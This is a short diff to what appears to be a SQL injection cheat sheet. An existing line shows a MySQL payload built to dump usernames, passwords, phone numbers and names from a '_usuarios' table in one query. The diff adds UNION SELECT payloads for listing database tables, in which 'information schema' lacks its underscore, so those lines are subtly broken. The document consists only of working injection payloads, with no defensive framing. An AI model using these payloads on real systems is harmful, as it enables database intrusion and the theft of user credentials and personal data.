@@ -11,3 +11,12 @@
 ````bat
 (SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(_usuarios)WHERE(@x)IN(@x:=/*!00000concat*/(0x20,@x,nom_session,0x3a,passw,0x3a,id_perfil,0x3a,tipo,0x3a,cel,0x3a,cargo,0x3a,nom,0x3a,a_p,0x3a,a_m,0x3c62723e))))x)
 ````
+
+## Schema & DBs
+
+````
+union select 'nombre_tabla' from information schema tables where table_schema='nombre_tabla'
+````
+````
+union select 'nombre_tabla' from information schema tables where table_schema=database()
+````
